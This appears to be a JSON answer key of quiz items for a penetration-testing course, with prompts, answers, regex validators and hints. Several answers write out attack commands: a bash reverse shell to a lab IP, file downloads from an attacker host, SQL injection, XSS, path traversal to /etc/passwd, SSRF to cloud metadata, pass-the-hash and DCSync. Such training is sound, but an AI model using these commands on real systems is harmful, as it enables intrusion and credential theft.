[
  {"module_id":2,"type":"multiple_choice","difficulty":"easy","prompt":"What Nmap flag performs a SYN stealth scan?","options":["-sT","-sS","-sU","-sV"],"answer":"-sS","explanation":"The -sS flag performs a SYN stealth scan, which is faster and less detectable than a full TCP connect scan.","validation_regex":null,"hints":["It's a 'stealth' scan","The flag starts with -s"]},
  {"module_id":2,"type":"fill_command","difficulty":"medium","prompt":"Write the Nmap command to scan all TCP ports on 10.10.10.5 with service version detection:","options":null,"answer":"nmap -p- -sV 10.10.10.5","explanation":"Use -p- for all ports and -sV for version detection.","validation_regex":"nmap.*-p-.*-sV.*10\\.10\\.10\\.5|nmap.*-sV.*-p-.*10\\.10\\.10\\.5","hints":["Use -p- for all ports","Add -sV for versions"]},
  {"module_id":2,"type":"decision_tree","difficulty":"medium","prompt":"You've found port 445 open on a Windows target. What's the best first step?","options":["Run Nmap --script=smb-vuln-*","Try smbclient with null session","Run enum4linux for enumeration","All of the above are valid"],"answer":"All of the above are valid","explanation":"All these approaches are valid starting points for SMB enumeration.","validation_regex":null,"hints":null},
  {"module_id":3,"type":"multiple_choice","difficulty":"easy","prompt":"Which tool is used to enumerate SMB shares?","options":["dig","smbmap","nslookup","nikto"],"answer":"smbmap","explanation":"smbmap is designed specifically for SMB share enumeration.","validation_regex":null,"hints":null},
  {"module_id":3,"type":"fill_command","difficulty":"medium","prompt":"Write the command to list SMB shares on 10.10.10.5 using a null session with smbclient:","options":null,"answer":"smbclient -L //10.10.10.5 -N","explanation":"The -L flag lists shares and -N uses a null session (no password).","validation_regex":"smbclient.*-L.*10\\.10\\.10\\.5.*-N|smbclient.*-N.*-L.*10\\.10\\.10\\.5","hints":["Use -L to list","Use -N for null session"]},
  {"module_id":3,"type":"case_file","difficulty":"hard","prompt":"<pre>smbclient -L //10.10.10.5 -N\nSharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nBackups         Disk      \nUsers           Disk      </pre>\nAnalyze this output. What shares should you investigate first?","options":null,"answer":"Backups and Users","explanation":"The Backups and Users shares are non-default shares that may contain sensitive data. Admin$, C$, and IPC$ are default shares requiring admin access.","validation_regex":"(?i)backup|user","hints":["Look for non-default shares","Default shares need admin"]},
  {"module_id":4,"type":"fill_command","difficulty":"easy","prompt":"Write the ffuf command to fuzz directories on http://10.10.10.5 using common.txt:","options":null,"answer":"ffuf -u http://10.10.10.5/FUZZ -w common.txt","explanation":"The FUZZ keyword marks where the wordlist entries will be inserted.","validation_regex":"ffuf.*-u.*http.*10\\.10\\.10\\.5.*FUZZ.*-w","hints":["Use FUZZ as placeholder","Specify wordlist with -w"]},
  {"module_id":4,"type":"multiple_choice","difficulty":"medium","prompt":"What does the -fc flag do in ffuf?","options":["Filter by content length","Filter by response code","Filter by word count","Force continue on errors"],"answer":"Filter by response code","explanation":"The -fc flag filters out responses with specific HTTP status codes (e.g., -fc 404 hides 404 responses).","validation_regex":null,"hints":null},
  {"module_id":6,"type":"fill_command","difficulty":"easy","prompt":"Write the command to start a Python HTTP server on port 8000:","options":null,"answer":"python3 -m http.server 8000","explanation":"This starts a simple HTTP server to host files for transfer.","validation_regex":"python3?.*-m.*http\\.server.*8000","hints":["Use python3","Use -m flag"]},
  {"module_id":6,"type":"multiple_choice","difficulty":"medium","prompt":"Which Windows command can download files via HTTP without PowerShell?","options":["wget","curl","certutil","bitsadmin"],"answer":"certutil","explanation":"certutil -urlcache -f URL can download files on Windows systems without requiring PowerShell.","validation_regex":null,"hints":null},
  {"module_id":7,"type":"fill_command","difficulty":"medium","prompt":"Write a bash reverse shell command connecting to 10.10.14.5 on port 4444:","options":null,"answer":"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1","explanation":"This redirects bash interactively to a TCP connection.","validation_regex":"bash.*-i.*\\/dev\\/tcp\\/10\\.10\\.14\\.5\\/4444","hints":["Use bash -i","Redirect to /dev/tcp"]},
  {"module_id":7,"type":"decision_tree","difficulty":"easy","prompt":"You got a shell but arrow keys don't work. What's the first step to upgrade it?","options":["Exit and reconnect","Run python -c 'import pty;pty.spawn(\"/bin/bash\")'","Use script /dev/null -c bash","Press Ctrl+Z"],"answer":"Run python -c 'import pty;pty.spawn(\"/bin/bash\")'","explanation":"Spawning a PTY with Python is typically the first step in shell upgrade.","validation_regex":null,"hints":null},
  {"module_id":9,"type":"multiple_choice","difficulty":"medium","prompt":"What hashcat mode (-m) is used for NTLM hashes?","options":["-m 0","-m 1000","-m 1800","-m 13100"],"answer":"-m 1000","explanation":"Mode 1000 is for NTLM hashes. Mode 0 is MD5, 1800 is SHA-512, 13100 is Kerberos TGS.","validation_regex":null,"hints":null},
  {"module_id":9,"type":"fill_command","difficulty":"medium","prompt":"Write the hashcat command to crack an NTLM hash file (ntlm.txt) using rockyou.txt:","options":null,"answer":"hashcat -m 1000 ntlm.txt rockyou.txt","explanation":"Use mode 1000 for NTLM hashes.","validation_regex":"hashcat.*-m.*1000.*ntlm.*rockyou","hints":["NTLM mode is 1000"]},
  {"module_id":10,"type":"case_file","difficulty":"medium","prompt":"<pre>PORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n445/tcp  open  microsoft-ds\n3306/tcp open  mysql</pre>\nWhat's your attack priority?","options":null,"answer":"FTP anonymous, SMB shares, web application","explanation":"Check FTP for anonymous access, SMB for null sessions/shares, and the web app for vulnerabilities. SSH and MySQL typically require credentials.","validation_regex":"(?i)ftp|smb|web|anon","hints":["Look for anonymous access","Web apps often have vulns"]},
  {"module_id":11,"type":"fill_command","difficulty":"hard","prompt":"Write the command to start a Chisel reverse SOCKS proxy server on port 8000:","options":null,"answer":"chisel server --reverse -p 8000","explanation":"The --reverse flag allows clients to create reverse tunnels.","validation_regex":"chisel.*server.*--reverse.*-p.*8000|chisel.*server.*-p.*8000.*--reverse","hints":["Use server mode","Add --reverse flag"]},
  {"module_id":11,"type":"multiple_choice","difficulty":"medium","prompt":"When using proxychains with Nmap, which scan type must you use?","options":["-sS (SYN)","-sT (TCP Connect)","-sU (UDP)","-sN (Null)"],"answer":"-sT (TCP Connect)","explanation":"Proxychains only works with full TCP connections. SYN scans require raw sockets which can't be proxied.","validation_regex":null,"hints":null},
  {"module_id":12,"type":"fill_command","difficulty":"medium","prompt":"Write the BloodHound Python command to collect all data from domain.local as user:pass:","options":null,"answer":"bloodhound-python -u user -p pass -d domain.local -c all","explanation":"BloodHound-python collects AD data for graph analysis.","validation_regex":"bloodhound-python.*-u.*-p.*-d.*domain.*-c.*all","hints":["Use -c all for everything"]},
  {"module_id":12,"type":"multiple_choice","difficulty":"easy","prompt":"What tool visualizes Active Directory attack paths?","options":["Mimikatz","BloodHound","Rubeus","PowerView"],"answer":"BloodHound","explanation":"BloodHound uses graph theory to find attack paths in Active Directory.","validation_regex":null,"hints":null},
  {"module_id":13,"type":"fill_command","difficulty":"hard","prompt":"Write the Impacket command to perform Kerberoasting against domain.local (user:pass, DC at 10.10.10.5):","options":null,"answer":"GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.5 -request","explanation":"GetUserSPNs.py requests TGS tickets for service accounts.","validation_regex":"GetUserSPNs.*domain.*user.*pass.*-dc-ip.*10\\.10\\.10\\.5.*-request","hints":["Use GetUserSPNs.py","Add -request flag"]},
  {"module_id":13,"type":"multiple_choice","difficulty":"medium","prompt":"What hashcat mode is used for Kerberos TGS (Kerberoast) tickets?","options":["-m 1000","-m 5600","-m 13100","-m 18200"],"answer":"-m 13100","explanation":"Mode 13100 is for Kerberos 5 TGS-REP etype 23 (crackable Kerberoast tickets).","validation_regex":null,"hints":null},
  {"module_id":17,"type":"fill_command","difficulty":"easy","prompt":"Write a basic SQL injection payload to bypass login:","options":null,"answer":"' OR '1'='1","explanation":"This classic payload makes the WHERE clause always true.","validation_regex":"'.*OR.*'1'.*=.*'1|\".*OR.*1.*=.*1","hints":["Make condition always true"]},
  {"module_id":17,"type":"decision_tree","difficulty":"medium","prompt":"You found a potential SQLi point. The app shows no errors. What technique should you try first?","options":["UNION-based injection","Time-based blind injection","Error-based injection","Out-of-band injection"],"answer":"Time-based blind injection","explanation":"When errors aren't shown, time-based blind injection using SLEEP() can confirm SQLi.","validation_regex":null,"hints":null},
  {"module_id":18,"type":"fill_command","difficulty":"medium","prompt":"Write the sqlmap command to dump the database 'webapp' table 'users' from a vulnerable URL:","options":null,"answer":"sqlmap -u URL -D webapp -T users --dump --batch","explanation":"Use -D for database, -T for table, --dump to extract data.","validation_regex":"sqlmap.*-u.*-D.*webapp.*-T.*users.*--dump","hints":["Specify database with -D","Specify table with -T"]},
  {"module_id":19,"type":"fill_command","difficulty":"easy","prompt":"Write an XSS payload that triggers an alert:","options":null,"answer":"<script>alert(1)</script>","explanation":"Basic XSS payload using script tags.","validation_regex":"<script>.*alert.*</script>","hints":null},
  {"module_id":20,"type":"fill_command","difficulty":"medium","prompt":"Write an LFI payload to read /etc/passwd traversing 5 directories:","options":null,"answer":"../../../../../etc/passwd","explanation":"Each ../ goes up one directory level.","validation_regex":"\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*\\.\\.\\/.*etc\\/passwd","hints":["Use ../ to traverse"]},
  {"module_id":20,"type":"multiple_choice","difficulty":"hard","prompt":"Which PHP wrapper can be used to read PHP source code via LFI?","options":["data://","file://","php://filter","expect://"],"answer":"php://filter","explanation":"php://filter/convert.base64-encode/resource=file.php returns the PHP source as base64.","validation_regex":null,"hints":null},
  {"module_id":22,"type":"fill_command","difficulty":"medium","prompt":"Write a command injection payload using command substitution:","options":null,"answer":"$(whoami)","explanation":"Command substitution with $() executes the inner command.","validation_regex":"\\$\\(.*\\)|`.*`","hints":["Use $() or backticks"]},
  {"module_id":25,"type":"fill_command","difficulty":"easy","prompt":"Write the command to find SUID binaries on Linux:","options":null,"answer":"find / -perm -4000 2>/dev/null","explanation":"The -perm -4000 finds files with the SUID bit set.","validation_regex":"find.*-perm.*4000|find.*-perm.*-u=s","hints":["Use find with -perm"]},
  {"module_id":25,"type":"multiple_choice","difficulty":"easy","prompt":"What's the first command to run for Linux privilege escalation?","options":["find / -perm -4000","sudo -l","uname -a","cat /etc/crontab"],"answer":"sudo -l","explanation":"sudo -l shows what commands the current user can run as root - often the fastest path to root.","validation_regex":null,"hints":null},
  {"module_id":25,"type":"case_file","difficulty":"hard","prompt":"<pre>$ sudo -l\nUser www-data may run the following commands on target:\n    (ALL) NOPASSWD: /usr/bin/vim</pre>\nHow do you escalate to root?","options":null,"answer":"sudo vim -c ':!/bin/bash'","explanation":"Vim can spawn a shell with :!/bin/bash. Since we can run it as root, we get a root shell.","validation_regex":"(?i)vim.*:!.*bash|vim.*:shell","hints":["Check GTFOBins for vim","Vim can spawn shells"]},
  {"module_id":26,"type":"fill_command","difficulty":"easy","prompt":"Write the Windows command to list all user privileges:","options":null,"answer":"whoami /all","explanation":"whoami /all shows user, groups, and all privileges.","validation_regex":"whoami.*\\/all","hints":["Use whoami with flags"]},
  {"module_id":26,"type":"multiple_choice","difficulty":"medium","prompt":"Which registry key indicates AlwaysInstallElevated is enabled?","options":["HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","HKLM\\SYSTEM\\CurrentControlSet\\Services","HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"],"answer":"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","explanation":"AlwaysInstallElevated must be set in both HKLM and HKCU under the Installer policy key.","validation_regex":null,"hints":null},
  {"module_id":7,"type":"fill_command","difficulty":"medium","prompt":"Write the netcat listener command on port 4444:","options":null,"answer":"nc -lvnp 4444","explanation":"-l listen, -v verbose, -n no DNS, -p port","validation_regex":"nc.*-l.*-.*p.*4444|nc.*-lvnp.*4444","hints":["Use -l for listen","-p for port"]},
  {"module_id":3,"type":"multiple_choice","difficulty":"easy","prompt":"What port does SNMP typically use?","options":["22","161","389","3389"],"answer":"161","explanation":"SNMP uses UDP port 161 for queries.","validation_regex":null,"hints":null},
  {"module_id":3,"type":"fill_command","difficulty":"medium","prompt":"Write the snmpwalk command to enumerate 10.10.10.5 with community string 'public':","options":null,"answer":"snmpwalk -v2c -c public 10.10.10.5","explanation":"Use -v2c for SNMP version 2c and -c for community string.","validation_regex":"snmpwalk.*-v2c.*-c.*public.*10\\.10\\.10\\.5","hints":["Specify version with -v","-c for community"]},
  {"module_id":8,"type":"fill_command","difficulty":"medium","prompt":"In Meterpreter, write the command to add a local port forward from local 8080 to 10.10.10.6:80:","options":null,"answer":"portfwd add -l 8080 -p 80 -r 10.10.10.6","explanation":"This forwards local port 8080 to the remote host's port 80.","validation_regex":"portfwd.*add.*-l.*8080.*-p.*80.*-r.*10\\.10\\.10\\.6","hints":["Use portfwd add"]},
  {"module_id":10,"type":"fill_command","difficulty":"medium","prompt":"Write the evil-winrm command to connect to 10.10.10.5 as user with password pass123:","options":null,"answer":"evil-winrm -i 10.10.10.5 -u user -p pass123","explanation":"evil-winrm provides an interactive PowerShell session over WinRM.","validation_regex":"evil-winrm.*-i.*10\\.10\\.10\\.5.*-u.*user.*-p.*pass123","hints":["-i for IP","-u for user"]},
  {"module_id":10,"type":"fill_command","difficulty":"hard","prompt":"Write the impacket-psexec command to get a shell as admin with NTLM hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:","options":null,"answer":"impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 admin@10.10.10.5","explanation":"Pass-the-hash with impacket using the -hashes flag.","validation_regex":"impacket-psexec.*-hashes.*:.*admin@","hints":["Use -hashes flag","Format: LM:NT"]},
  {"module_id":13,"type":"fill_command","difficulty":"hard","prompt":"Write the secretsdump command to DCSync as domain\\admin with password P@ssw0rd from DC at 10.10.10.5:","options":null,"answer":"secretsdump.py domain/admin:P@ssw0rd@10.10.10.5","explanation":"secretsdump.py performs DCSync to dump all domain hashes.","validation_regex":"secretsdump.*domain.*admin.*@10\\.10\\.10\\.5","hints":["Format: domain/user:pass@ip"]},
  {"module_id":6,"type":"fill_command","difficulty":"medium","prompt":"Write the PowerShell command to download a file from http://10.10.14.5/nc.exe to C:\\temp\\nc.exe:","options":null,"answer":"Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\\temp\\nc.exe","explanation":"IWR (Invoke-WebRequest) downloads files in PowerShell.","validation_regex":"(?i)invoke-webrequest|iwr.*-uri.*-outfile|wget","hints":["Use Invoke-WebRequest or iwr"]},
  {"module_id":2,"type":"case_file","difficulty":"medium","prompt":"<pre>PORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 7.9\n80/tcp    open  http    Apache 2.4.29\n3306/tcp  open  mysql   MySQL 5.7.25\n8080/tcp  open  http    Jetty 9.4.z</pre>\nWhich service version should you prioritize researching for exploits?","options":null,"answer":"Apache 2.4.29 or Jetty 9.4","explanation":"Apache 2.4.29 may be vulnerable to CVE-2021-41773/42013 if running on Ubuntu. Jetty and older MySQL versions also have known vulnerabilities.","validation_regex":"(?i)apache|jetty|2\\.4\\.29","hints":["Check for CVEs","Focus on web servers"]},
  {"module_id":21,"type":"multiple_choice","difficulty":"medium","prompt":"What magic bytes indicate a GIF file?","options":["PK","89 50 4E 47","GIF89a","FF D8 FF"],"answer":"GIF89a","explanation":"GIF89a is the magic bytes signature for GIF images. This can be prepended to a web shell to bypass basic checks.","validation_regex":null,"hints":null},
  {"module_id":14,"type":"multiple_choice","difficulty":"easy","prompt":"What's the default Burp Suite proxy port?","options":["80","443","8080","8888"],"answer":"8080","explanation":"Burp Suite's proxy listener runs on 127.0.0.1:8080 by default.","validation_regex":null,"hints":null},
  {"module_id":23,"type":"fill_command","difficulty":"medium","prompt":"Write an SSRF payload to access the AWS metadata endpoint:","options":null,"answer":"http://169.254.169.254/latest/meta-data/","explanation":"The AWS metadata service is accessible at this IP from any EC2 instance.","validation_regex":"169\\.254\\.169\\.254.*meta-?data","hints":["AWS uses 169.254.169.254"]},
  {"module_id":12,"type":"multiple_choice","difficulty":"medium","prompt":"Which PowerView command finds computers where the current user has local admin access?","options":["Get-DomainUser","Get-DomainComputer","Find-LocalAdminAccess","Get-NetLocalGroup"],"answer":"Find-LocalAdminAccess","explanation":"Find-LocalAdminAccess tests each computer in the domain for local admin access.","validation_regex":null,"hints":null},
  {"module_id":13,"type":"multiple_choice","difficulty":"hard","prompt":"What Active Directory attack extracts the entire domain password database?","options":["Kerberoasting","AS-REP Roasting","DCSync","Golden Ticket"],"answer":"DCSync","explanation":"DCSync mimics domain controller replication to extract all password hashes from the domain.","validation_regex":null,"hints":null},
  {"module_id":1,"type":"multiple_choice","difficulty":"easy","prompt":"What document defines the scope and rules of engagement for a penetration test?","options":["Vulnerability Report","Statement of Work","Rules of Engagement","Risk Assessment"],"answer":"Rules of Engagement","explanation":"The Rules of Engagement (RoE) document defines what is in/out of scope and what techniques can be used.","validation_regex":null,"hints":null},
  {"module_id":15,"type":"fill_command","difficulty":"medium","prompt":"Write an ffuf command to fuzz the 'id' parameter value on http://10.10.10.5/page?id=FUZZ using numbers 1-1000:","options":null,"answer":"ffuf -u 'http://10.10.10.5/page?id=FUZZ' -w <(seq 1 1000)","explanation":"Parameter fuzzing helps find valid ID values or injection points.","validation_regex":"ffuf.*-u.*id=FUZZ.*-w|ffuf.*-w.*-u.*id=FUZZ","hints":["Put FUZZ where you want to fuzz"]}
]
